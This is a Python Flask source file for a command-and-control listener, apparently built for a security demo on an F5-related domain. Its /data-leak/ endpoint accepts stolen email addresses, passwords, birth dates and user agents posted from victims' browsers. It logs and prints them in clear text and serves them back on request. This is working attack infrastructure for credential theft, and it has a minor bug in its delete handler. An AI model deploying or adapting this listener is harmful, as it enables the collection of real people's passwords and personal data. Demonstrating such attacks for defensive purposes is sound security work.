from flask import Flask, request
from flask_cors import CORS
from flask_restful import Api, Resource
from flasgger import Swagger
import pprint

# -------------- API --------------
# listener
application = Flask(__name__)

"""
application.config['SWAGGER'] = {
    'title': 'C2 server F5',
    'openapi': '3.0.2'
}
"""
# CORS(application)
api = Api(application)
CORS(application)
swagger = Swagger(application)


def main():
    debug = True
    verbose = True
    log_file = 'logs/c2.log'

    # Logging settings
    global logger
    logger = setup_logging(debug, verbose, log_file)

    # Start API
    global data_leaked
    data_leaked = {}
    print("---------------------------------- C2 LISTENER ----------------------------------")
    logger.warning("c2 started")
    pprint.pprint("API dev portal: https://c2-server.f5cloudbuilder.dev:5000/apidocs/")
    application.run(
        debug=debug,
        host="0.0.0.0",
        use_reloader=True,
        port=5000,
        ssl_context=('c2-server.f5cloudbuilder.dev.crt', 'c2-server.f5cloudbuilder.dev.pem')
    )


def setup_logging(debug, verbose, log_file):
    import logging

    if debug:
        log_level = logging.DEBUG
    elif verbose:
        log_level = logging.INFO
    else:
        log_level = logging.WARNING

    logging.basicConfig(filename=log_file, format='%(asctime)s %(levelname)s %(message)s', level=log_level)
    return logging.getLogger(__name__)


class ApiDataLeak(Resource):
    def post(self):
        """
        Upsert data leak
        ---
        tags:
          - demo
        consumes:
          - application/json; charset=utf-8
        parameters:
          - in: body
            name: body
            schema:
              required:
                - email
                - password
                - birth_date
                - uagent
              properties:
                email:
                  type: string
                  default: '*'
                password:
                  type: string
                  default: '*'
                birth_date:
                  type: string
                  default: '*'
                uagent:
                  type: string
                  default: '*'
        responses:
          200:
            description: OK
        """
        data_json = request.get_json(force=True)
        logger.info("api=ApiDataLeak;method=POST;email=%s;password=%s;birth_date=%s;uagent=%s" %
                    (data_json['email'], data_json['password'], data_json['birth_date'], data_json['uagent']))
        print("-------------- DATA LEAK RECEIVED --------------")
        print("email: %s" % data_json['email'])
        print("password: %s" % data_json['password'])
        print("birth_date: %s" % data_json['birth_date'])
        print("User-Agent: %s" % data_json['uagent'])

        msg = {
            "status": "OK",
        }
        return msg, 200

    def delete(self):
        """
        Delete data leak DB
        ---
        tags:
          - demo
        parameters: []
        responses:
          200:
            description: OK
        """
        data_leaked = {}
        msg = {
            "status": "OK",
        }
        return msg, 200

    def get(self):
        """
        Get data leak DB
        ---
        tags:
          - demo
        parameters: []
        responses:
          200:
            description: OK
        """

        return data_leaked, 200


api.add_resource(ApiDataLeak, '/data-leak/')

# Start program
if __name__ == "__main__":
    main()
